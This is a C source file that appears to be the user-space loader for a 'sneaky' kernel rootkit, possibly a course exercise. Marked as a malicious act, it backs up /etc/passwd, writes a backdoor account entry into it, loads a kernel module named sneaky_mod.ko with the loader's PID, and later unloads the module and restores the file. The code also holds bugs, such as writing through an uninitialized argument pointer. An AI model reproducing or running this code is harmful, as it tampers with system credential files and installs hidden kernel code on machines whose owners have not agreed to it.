#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<sys/types.h>
void copyFileAndWrite(void){
  //copy /etc/passwd file to /tmp/password
  FILE* fp1 = fopen("/etc/passwd", "r+");
  if(fp1 == NULL){
    printf("Cannot open /etc/passwd file!\n");
    exit(EXIT_FAILURE);
  }
  FILE* fp2 = fopen("/tmp/passwd","w");
  if(fp2 == NULL){
    printf("Cannot open /tmp/passwd file!\n");
    exit(EXIT_FAILURE);
  }
  //copy the content of the old file to the new file
  char a;
  do {
    a = fgetc(fp1);
    if(a != EOF){
    fputc(a, fp2);
    }
  } while (a != EOF);
  fclose(fp2);
  //add a string to the copied file
  fprintf(fp1,"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
  fclose(fp1);
}


int main(){
  //malicious act
  copyFileAndWrite();
  //load the module
  pid_t PID = getpid();   
  pid_t pid = fork(); // integer that can store a process ID
  int status;
  if (pid == -1) {
    perror("fork"); // this function automatically checks "errno"
    // and prints the error plus what you give it
    exit(EXIT_FAILURE);
  }
  // by when there will be two processes
  else if(pid == 0){//child process
    char* argv[4];  
    char* prog = "insmod";
    argv[0] = prog;
    argv[1] = "sneaky_mod.ko";
    //    pid_t PID = getpid();  
    sprintf(argv[2],"PID=%d",PID);
    argv[3] = NULL;    
    status = execvp(prog,argv);
    perror("execvp");
    return status;   
 }
 else{//parent process
   if(waitpid(pid,&status,0) < 0){
     perror("waitpid()");
     return EXIT_FAILURE;
   }
   if(WIFSIGNALED(status)){
     printf("Program was killed by signal %d\n", WTERMSIG(status));
   }
   else{
     printf("Program exited with status %d\n",WEXITSTATUS(status));
   }
 }
  //enter the loop
  char check;
  do {
      check = getchar();
     	}
   while(check != 'q');
  //unload the module 
 pid_t pid_2 = fork(); // integer that can store a process ID
  int status_2;
  if (pid_2 == -1) {
    perror("fork"); // this function automatically checks "errno"
    // and prints the error plus what you give it
    exit(EXIT_FAILURE);
  }
  // by when there will be two processes
  else if(pid_2 == 0){//child process
    char* argv[3];  
    char* prog = "rmmod";
    argv[0] = prog;
    argv[1] = "sneaky_mod.ko";
    argv[2] = NULL;    
    status_2 = execvp(prog,argv);
    perror("execvp");
    return status_2;   
  }
  else{//parent process
    if(waitpid(pid_2,&status_2,0) < 0){
      perror("waitpid()");
      return EXIT_FAILURE;
    }
    if(WIFSIGNALED(status)){
      printf("Program was killed by signal %d\n", WTERMSIG(status_2));
    }
    else{
      printf("Program exited with status %d\n",WEXITSTATUS(status_2));
    }
  }
  pid_t pid_3 = fork(); // integer that can store a process ID
  int status_3;
  if (pid_3 == -1) {
    perror("fork"); // this function automatically checks "errno"
    // and prints the error plus what you give it
    exit(EXIT_FAILURE);
  }
  // by when there will be two processes
  else if(pid_3 == 0){//child process
    char* argv[4];  
    char* prog = "cp";
    argv[0] = prog;
    argv[1] = "/tmp/passwd";
    argv[2] = "/etc/passwd";
    argv[3] = NULL;    
    status_3 = execvp(prog,argv);
    perror("execvp");
    return status_3;   
 }
 else{//parent process
   if(waitpid(pid_3,&status_3,0) < 0){
     perror("waitpid()");
     return EXIT_FAILURE;
   }
   if(WIFSIGNALED(status)){
     printf("Program was killed by signal %d\n", WTERMSIG(status_3));
   }
   else{
     printf("Program exited with status %d\n",WEXITSTATUS(status_3));
   }
 }
}
